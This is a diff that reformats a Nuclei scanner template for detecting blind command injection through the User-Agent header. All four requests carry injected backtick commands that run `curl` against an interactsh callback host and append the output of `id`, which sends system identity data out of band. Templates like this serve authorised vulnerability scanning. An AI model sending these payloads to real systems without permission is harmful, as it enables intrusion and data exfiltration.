@@ -1,50 +1,54 @@
-id: blind-rce-user-agent
-
-info:
-  name: dk4trin Blind Command Injection
-  author: dk4trin
-  severity: critical
-  description: Command Injection Blind
-  tags: rce,generic
-
 http:
-  - raw:
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: `curl -v {{interactsh-url}}$(id)`
+- extractors:
+  - group: 1
+    part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  matchers:
+  - part: interactsh_protocol
+    type: word
+    words:
+    - dns
+    - http
+  - part: interactsh_request
+    regex:
+    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
+    type: regex
+  matchers-condition: and
+  raw:
+  - 'GET / HTTP/1.1
 
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: `curl -v {{interactsh-url}}.$(id)`
+    Host: {{Hostname}}
 
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: `curl -v $(id){{interactsh-url}}`
+    User-Agent: `curl -v {{interactsh-url}}$(id)`
 
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        User-Agent: `curl -v $(id).{{interactsh-url}}$(id)`
-        
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol
-        words:
-          - "dns"
-          - "http"
+    '
+  - 'GET / HTTP/1.1
 
-      - type: regex
-        part: interactsh_request
-        regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+    Host: {{Hostname}}
 
-    extractors:
-      - type: regex
-        part: interactsh_request
-        group: 1
-        regex:
-          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
+    User-Agent: `curl -v {{interactsh-url}}.$(id)`
+
+    '
+  - 'GET / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: `curl -v $(id){{interactsh-url}}`
+
+    '
+  - 'GET / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: `curl -v $(id).{{interactsh-url}}$(id)`
+
+    '
+id: blind-rce-user-agent
+info:
+  author: dk4trin
+  description: Command Injection Blind
+  name: dk4trin Blind Command Injection
+  severity: critical
+  tags: rce,generic
